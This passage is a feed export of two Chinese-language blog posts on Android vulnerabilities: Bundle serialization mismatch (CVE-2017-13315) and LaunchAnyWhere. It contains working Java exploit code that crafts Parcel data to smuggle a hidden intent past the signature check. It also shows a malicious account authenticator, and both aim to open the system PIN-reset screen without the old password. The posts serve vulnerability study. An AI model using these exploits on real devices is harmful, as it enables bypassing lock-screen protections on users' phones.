|b.l.e...d.a.t.a.|</span><br><span class="line">00000070  2e 00 4d 00 79 00 4d 00  69 00 73 00 6d 00 61 00  |..M.y.M.i.s.m.a.|</span><br><span class="line">00000080  74 00 63 00 68 00 50 00  61 00 72 00 63 00 65 00  |t.c.h.P.a.r.c.e.|</span><br><span class="line">00000090  6c 00 00 00 7b 00 00 00                           |l...&#123;...|</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000  94 00 00 00 42 4e 44 4c  01 00 00 00 06 00 00 00  |....BNDL........|</span><br><span class="line">00000010  6d 00 79 00 74 00 65 00  73 00 74 00 00 00 00 00  |m.y.t.e.s.t.....|</span><br><span class="line">00000020  04 00 00 00 35 00 00 00  63 00 6f 00 6d 00 2e 00  |....5...c.o.m...|</span><br><span class="line">00000030  65 00 67 00 67 00 75 00  6e 00 63 00 6c 00 65 00  |e.g.g.u.n.c.l.e.|</span><br><span class="line">00000040  2e 00 6d 00 69 00 73 00  6d 00 61 00 74 00 63 00  |..m.i.s.m.a.t.c.|</span><br><span class="line">00000050  68 00 70 00 61 00 72 00  63 00 65 00 6c 00 61 00  |h.p.a.r.c.e.l.a.|</span><br><span class="line">00000060  62 00 6c 00 65 00 2e 00  64 00 61 00 74 00 61 00  |b.l.e...d.a.t.a.|</span><br><span class="line">00000070  2e 00 4d 00 79 00 4d 00  69 00 73 00 6d 00 61 00  |..M.y.M.i.s.m.a.|</span><br><span class="line">00000080  74 00 63 00 68 00 50 00  61 00 72 00 63 00 65 00  |t.c.h.P.a.r.c.e.|</span><br><span class="line">00000090  6c 00 00 00 7b 00 00 00  00 00 00 00              |l...&#123;.......|</span><br></pre></td></tr></table></figure><p>可以很清楚的看到,最后多了四位,我们的重点就在利用这四字节的偏移.</p><p>我们可以在它后面再加上一个键值对,键为6,值的类型为byte,也就是13,将恶意数据拼接在后面,这样我们构造的bundle数据大概如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|第一个键值对|第二个      |</span><br><span class="line">|mytest| 1 |6|13|evilkv|</span><br><span class="line">而在一次不匹配的序列化反序列化之后,它会变成这样</span><br><span class="line">|第一个键值对|第二个     |第三个</span><br><span class="line">|mytest| 1 | 0 | 6 |13|evilkv</span><br></pre></td></tr></table></figure><p>这里只是一个粗略的示意,在不匹配的序列化反序列化发生之后,第二个键值对的键,变为了空,而它的值变为了 6 13 这里的6其实代表long型,然后13就是它的值,后面其实还有byte的长度信息,这里会一并被当成第二个键的值,而这个时候,第三个键,也就是我们藏起来的那个,就出现了,这样就能在check的时候绕过,下面我们通过代码来构造它:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Parcel parcel = Parcel.obtain();</span><br><span class="line">   String evilData = &quot;evil data&quot;;</span><br><span class="line">   //键值对的数量,为3,这里其实有构建四个键值对,存在不匹配问题的类的键值对,用来隐藏恶意键值对的键值对,恶意键值对,还有一个占坑</span><br><span class="line">   //的键值对,这里给设置为三,因为在隐藏的键值对被还原的时候,隐藏的键值对就是第三个,如果设置为2,那么就读不到了</span><br><span class="line">   parcel.writeInt(3);  </span><br><span class="line">   //parcel.writeInt(1);</span><br><span class="line">   //第一个键</span><br><span class="line">   //第一个键的内容</span><br><span class="line">   parcel.writeString(&quot;mytest&quot;);</span><br><span class="line">   //值的类型 4 代表序列化对象</span><br><span class="line">   parcel.writeInt(4);</span><br><span class="line">   //对应的类</span><br><span class="line">   parcel.writeString(&quot;com.egguncle.mismatchparcelable.data.MyMismatchParcel&quot;);</span><br><span class="line">   //写入数据</span><br><span class="line">   parcel.writeInt(123);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   //第二个键的键值长度</span><br><span class="line">   parcel.writeInt(1);</span><br><span class="line">   //第二个键的键值</span><br><span class="line">   parcel.writeInt(6);</span><br><span class="line">   //代表值为 byte类型</span><br><span class="line">   parcel.writeInt(13);</span><br><span class="line"></span><br><span class="line">   //占个坑,一会儿回来给它写上咱们evil kv的,这里代表byte的长度</span><br><span class="line">   parcel.writeInt(-1);</span><br><span class="line"></span><br><span class="line">   int keyIntentStartPos = parcel.dataPosition();</span><br><span class="line">   parcel.writeString(&quot;evilkv&quot;);</span><br><span class="line">   //值的类型</span><br><span class="line">   parcel.writeInt(4);</span><br><span class="line">   //对应的类</span><br><span class="line">   parcel.writeString(&quot;com.egguncle.mismatchparcelable.data.EvilParcel&quot;);</span><br><span class="line">   //写入数据</span><br><span class="line">   parcel.writeString(evilData);</span><br><span class="line"></span><br><span class="line">   int keyIntentEndPos = parcel.dataPosition();</span><br><span class="line">   int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;</span><br><span class="line">   // backpatch length of evilkv,回到前面那个-1处,把恶意键值对填上</span><br><span class="line">   parcel.setDataPosition(keyIntentStartPos - 4);  </span><br><span class="line">   parcel.writeInt(lengthOfKeyIntent);</span><br><span class="line">   //回到末尾,继续写第三个键值对</span><br><span class="line">   parcel.setDataPosition(keyIntentEndPos);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   //因为最后恶意kv被取出来以后,,bundle实际上就有了三个kv(在不算最后这一个的情况下)</span><br><span class="line">   // 第三个kv就是我们的恶意kv,而bundle的数量只能大不能小不然就读不到第三个了</span><br><span class="line">   parcel.writeString(&quot;Padding-Key&quot;);</span><br><span class="line">   parcel.writeInt(0); // VAL_STRING</span><br><span class="line">   parcel.writeString(&quot;Padding-Value&quot;);</span><br><span class="line"></span><br><span class="line">   Parcel targetParcel = Parcel.obtain();</span><br><span class="line">   int length = parcel.dataSize();</span><br><span class="line">   targetParcel.writeInt(length);</span><br><span class="line">   targetParcel.writeInt(0x4c444E42);</span><br><span class="line">   targetParcel.appendFrom(parcel, 0, length);</span><br><span class="line">   targetParcel.setDataPosition(0);</span><br><span class="line"></span><br><span class="line">   Bundle bundle = new Bundle();</span><br><span class="line">   bundle.setClassLoader(getClass().getClassLoader());</span><br><span class="line">   bundle.readFromParcel(targetParcel);</span><br><span class="line"></span><br><span class="line">   MyFileUtil.dumpBundle(targetParcel, &quot;test1&quot;);</span><br><span class="line"></span><br><span class="line">   if (checkBundle(bundle))&#123;</span><br><span class="line">       Intent intent = new Intent(MainActivity.this, Main2Activity.class);</span><br><span class="line">       intent.putExtras(bundle);</span><br><span class="line">       startActivity(intent);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       Log.i(TAG, &quot;there is a evilkv!&quot;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>现在运行代码来看一下结果<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2022-02-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>可以看到我们的数据确实是有了,绕过了界面1中的检测,也在界面2中成功读到了数据,我们再来看一下这两次的bundle数据<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2022-05-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>可以看到在00000090这一行,由于不匹配的读写,导致错位了四位,第二个键值对被当成了键为空,值为long型,内容为940000000d,这就是上面截图输出里面的635655159821的十六进制表示</p><p><a href="https://raw.githubusercontent.com/EggUncle/MismatchParcel" target="_blank" rel="noopener">代码</a></p><h3 id="0x04实战-CVE-2017-13315"><a href="#0x04实战-CVE-2017-13315" class="headerlink" title="0x04实战 CVE-2017-13315"></a>0x04实战 CVE-2017-13315</h3><p>上次我们提到了launchanywhere这个漏洞,现在我们来利用这次提到的知识点来绕过修复之后的限制.<br>在CVE-2017-13315这个漏洞中,出现问题的类是DcParamObject,它出现的问题和上面的例子一样,在写时将数据以long形式写入,但是读的时候是int<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void writeToParcel(Parcel dest, int flags) &#123;</span><br><span class="line">    dest.writeInt(mSubId);</span><br><span class="line">&#125;</span><br><span class="line">private void readFromParcel(Parcel in) &#123;</span><br><span class="line">    mSubId = in.readInt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以利用的方法,和上面的一样的,只是我们的evilkv,需要构造成指定想要跳转的目标页面,这里以设置pin码为例,和以前的launchanywhere例子一样,重置pin码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Bundle evilBundle = new Bundle();</span><br><span class="line">        Parcel bndlData = Parcel.obtain();</span><br><span class="line">        Parcel pcelData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">        // Manipulate the raw data of bundle Parcel</span><br><span class="line">        // Now we replace this right Parcel data to evil Parcel data</span><br><span class="line">        pcelData.writeInt(3); // number of elements in ArrayMap</span><br><span class="line">        /*****************************************/</span><br><span class="line">        // mismatched object</span><br><span class="line">        pcelData.writeString(&quot;mismatch&quot;);</span><br><span class="line">        pcelData.writeInt(4); // VAL_PACELABLE</span><br><span class="line">        pcelData.writeString(&quot;com.android.internal.telephony.DcParamObject&quot;); // name of Class Loader</span><br><span class="line">        pcelData.writeInt(1);//mSubId</span><br><span class="line"></span><br><span class="line">        pcelData.writeInt(1);</span><br><span class="line">        pcelData.writeInt(6);</span><br><span class="line">        pcelData.writeInt(13);</span><br><span class="line">        //pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent</span><br><span class="line">        pcelData.writeInt(-1); // dummy, will hold the length</span><br><span class="line">        int keyIntentStartPos = pcelData.dataPosition();</span><br><span class="line">        // Evil object hide in ByteArray</span><br><span class="line">        pcelData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">        pcelData.writeInt(4);</span><br><span class="line">        pcelData.writeString(&quot;android.content.Intent&quot;);// name of Class Loader</span><br><span class="line">        pcelData.writeString(Intent.ACTION_RUN); // Intent Action</span><br><span class="line">        Uri.writeToParcel(pcelData, null); // Uri is null</span><br><span class="line">        pcelData.writeString(null); // mType is null</span><br><span class="line">        pcelData.writeInt(0x10000000); // Flags</span><br><span class="line">        pcelData.writeString(null); // mPackage is null</span><br><span class="line">        pcelData.writeString(&quot;com.android.settings&quot;);</span><br><span class="line">        pcelData.writeString(&quot;com.android.settings.password.ChooseLockPassword&quot;);</span><br><span class="line">        pcelData.writeInt(0); //mSourceBounds = null</span><br><span class="line">        pcelData.writeInt(0); // mCategories = null</span><br><span class="line">        pcelData.writeInt(0); // mSelector = null</span><br><span class="line">        pcelData.writeInt(0); // mClipData = null</span><br><span class="line">        pcelData.writeInt(-2); // mContentUserHint</span><br><span class="line">        pcelData.writeBundle(null);</span><br><span class="line"></span><br><span class="line">        int keyIntentEndPos = pcelData.dataPosition();</span><br><span class="line">        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;</span><br><span class="line">        pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT</span><br><span class="line">        pcelData.writeInt(lengthOfKeyIntent);</span><br><span class="line">        pcelData.setDataPosition(keyIntentEndPos);</span><br><span class="line">        Log.d(TAG, &quot;Length of KEY_INTENT is &quot; + Integer.toHexString(lengthOfKeyIntent));</span><br><span class="line"></span><br><span class="line">        ///////////////////////////////////////</span><br><span class="line">        pcelData.writeString(&quot;Padding-Key&quot;);</span><br><span class="line">        pcelData.writeInt(0); // VAL_STRING</span><br><span class="line">        pcelData.writeString(&quot;Padding-Value&quot;); //</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        int length  = pcelData.dataSize();</span><br><span class="line">        Log.d(TAG, &quot;length is &quot; + Integer.toHexString(length));</span><br><span class="line">        bndlData.writeInt(length);</span><br><span class="line">        bndlData.writeInt(0x4c444E42);</span><br><span class="line">        bndlData.appendFrom(pcelData, 0, length);</span><br><span class="line">        bndlData.setDataPosition(0);</span><br><span class="line">        evilBundle.readFromParcel(bndlData);</span><br><span class="line">        Log.d(TAG, evilBundle.toString());</span><br><span class="line">       return evilBundle;</span><br></pre></td></tr></table></figure></p><p>这一段的出处是<a href="http://www.droidsec.cn/bundle%E9%A3%8E%E6%B0%B4-android%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">http://www.droidsec.cn/bundle%E9%A3%8E%E6%B0%B4-android%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</a><br>这篇文章,因为我们的重点在于讲解原理,所以实战部分,就不自己做了,有兴趣的朋友可以自行尝试.</p><p>其实这里是有限制的,仍然会让你先确认pin码,qq支付宝等等带着手势锁定功能的我都试了试,其实都是有做限制的,会先让你确认现在的密码,大多数应用都会有类似的安全策略吧,这里也不谈不正当用途了.</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2022-27-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Android中的序列化反序列化不匹配导致的漏洞解析&quot;&gt;&lt;a href=&quot;#Android中的序列化反序列化不匹配导致的漏洞解析&quot; class=&quot;headerlink&quot; title=&quot;Android中的序列化反序列化不匹配导致的漏洞解析&quot;&gt;&lt;/a&gt;Android中的序列化反序列化不匹配导致的漏洞解析&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;本文仅供安全技术交流,请勿用于不正当的用途,造成的一切后果与本文作者无关.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;上一次提到了&lt;a href=&quot;https://github.com/EggUncle/LaunchAnyWhere&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;launchAnyWhere&lt;/a&gt;这个漏洞,其中提到了修补方案,就是去验证intent指向的app和appB是不是有相同签名的,这里有这样一段:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;if (result != null&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                    &amp;amp;&amp;amp; (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                /*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                 * The Authenticator API allows third party authenticators to&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                 * supply arbitrary intents to other apps that they can run,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                 * this can be very bad when those apps are in the system like&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                 * the System Settings.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                PackageManager pm = mContext.getPackageManager();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                ResolveInfo resolveInfo = pm.resolveActivity(intent, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                int targetUid = resolveInfo.activityInfo.applicationInfo.uid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                int authenticatorUid = Binder.getCallingUid();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                if (PackageManager.SIGNATURE_MATCH !=&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                        pm.checkSignatures(authenticatorUid, targetUid)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                    throw new SecurityException(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                            &amp;quot;Activity to be started with KEY_INTENT must &amp;quot; +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                            &amp;quot;share Authenticator&amp;apos;s signatures&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到这里有检查result.getParcelable(AccountManager.KEY_INTENT)是否为空,如果不是,就对他进行检查.那有没有绕过的方法?&lt;/p&gt;
&lt;p&gt;有的&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android LaunchAnyWhere</title>
    <link href="http://yoursite.com/2018/06/17/Android-LaunchAnyWhere/"/>
    <id>http://yoursite.com/2018/06/17/Android-LaunchAnyWhere/</id>
    <published>2018-06-16T17:45:49.000Z</published>
    <updated>2020-07-28T14:06:58.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LaunchAnyWhere"><a href="#LaunchAnyWhere" class="headerlink" title="LaunchAnyWhere"></a>LaunchAnyWhere</h1><p>4.3及以下的一个系统漏洞</p><blockquote><p>本文仅供安全技术交流,请勿用于不正当的用途,造成的一切后果与本文作者无关.</p></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近看了一点儿系统安全相关的东西,想了解一下java序列化反序列化的东西,正好看到LaunchAnyWhere这个比较经典的漏洞,也尝试了一下,触发机制和原理都比较简单,但是危害也不小.所以这里也顺手记下来.</p><p>再顺带提一下,这个漏洞在Android4.3之后就失效了~</p><a id="more"></a><h3 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h3><h4 id="1-Android-账户系统"><a href="#1-Android-账户系统" class="headerlink" title="1.Android 账户系统"></a>1.Android 账户系统</h4><p>Android2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令牌和密码，比如，我们的手机存在多个账户，每个账户下面都有不同的信息，甚至每个账户都可以与不同的服务器之间进行数据同步（例如，手机账户中的联系人可以是一个Gmail账户中的通讯录，可联网进行同步更新）</p><h4 id="2-Android中添加账户的基本流程"><a href="#2-Android中添加账户的基本流程" class="headerlink" title="2.Android中添加账户的基本流程"></a>2.Android中添加账户的基本流程</h4><p>比如现在有两个app,appA需要使用到appB中的账户信息,而appB本身也提供了这种功能,那么就可以进行添加账户的操作.<br><br>普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。<br><br>整个流程如下图所示:</p><p><img src="http://retme.net/usr/uploads/image/20140820/20140820062918_12778.png" alt=""></p><p>我们带着图缕一下流程,首先appA请求添加账户,然后系统发现appb可以提供这个账户服务,就去请求b,b返回一个intent给系统,系统返回给a,a启动这个页面.</p><h4 id="3-安全隐患"><a href="#3-安全隐患" class="headerlink" title="3.安全隐患"></a>3.安全隐患</h4><p>将上面的东西总结成一句话就是:<br><br>使用appA打开appB指定的一个界面<br><br>那这里就有一个比较明显的安全问题,如果appA是具有较高权限的系统级应用,那这里是不是就可以通过指定appB返回的intent的内容来打开任意界面了,甚至是本身不导出的?<br></p><h3 id="0x02-实现"><a href="#0x02-实现" class="headerlink" title="0x02 实现"></a>0x02 实现</h3><p>按照上面提到的信息,我们尝试一下,打开一个比较重要的界面,去实现无密码的情况下,对pin码进行重置.<br><br>这里是需要一些Android开发的相关知识的,贴一篇别人的博客,这里就不赘述了.<br><br><a href="https://blog.csdn.net/kifile/article/details/40949975" target="_blank" rel="noopener">https://blog.csdn.net/kifile/article/details/40949975</a></p><p>首先我们需要新建一个属于自己的提供帐号服务的类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class MyAccountService extends Service &#123;</span><br><span class="line"></span><br><span class="line">    private MyAuthenticator myAuthenticator;</span><br><span class="line"></span><br><span class="line">    public MyAccountService() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onCreate() &#123;</span><br><span class="line">        super.onCreate();</span><br><span class="line">        myAuthenticator = new MyAuthenticator(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public IBinder onBind(Intent intent) &#123;</span><br><span class="line">        return myAuthenticator.getIBinder();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实现的功能也比较简单,就是在onBind返回一个IBinder,然后再实现一个自己的AbstractAccountAuthenticator类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public class MyAuthenticator extends AbstractAccountAuthenticator &#123;</span><br><span class="line">    private final static String TAG = MyAuthenticator.class.getName();</span><br><span class="line"></span><br><span class="line">    public MyAuthenticator(Context context) &#123;</span><br><span class="line">        super(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle bundle) throws NetworkErrorException &#123;</span><br><span class="line">        Log.i(TAG, &quot;addAccount: &quot;);</span><br><span class="line">        Intent intent = new Intent();</span><br><span class="line">        intent.setComponent(new ComponentName(</span><br><span class="line">                &quot;com.android.settings&quot;,</span><br><span class="line">                &quot;com.android.settings.ChooseLockPassword&quot;));</span><br><span class="line">        intent.setAction(Intent.ACTION_RUN);</span><br><span class="line">        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        intent.putExtra(&quot;confirm_credentials&quot;,false);</span><br><span class="line">        bundle.putParcelable(AccountManager.KEY_INTENT, intent);</span><br><span class="line"></span><br><span class="line">        return bundle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当appA向b发起添加账户的请求后,appb就会调用addacount将包含对应信息的bundle返回,这个地发就是利用的关键,我们将这个组件指定为设置pin码的界面,也就是希望能使用appa调起重置pin码的界面.</p><p>最后不要忘了添加权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.AUTHENTICATE_ACCOUNTS&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p>然后就是安装app了,安装完成后打开设置-&gt;添加账户,可以看到里面已经有了我们刚刚写的应用的选项</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-11%2022-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>点击这个列表项</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-11%2022-39-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><h3 id="0x03-修复方案"><a 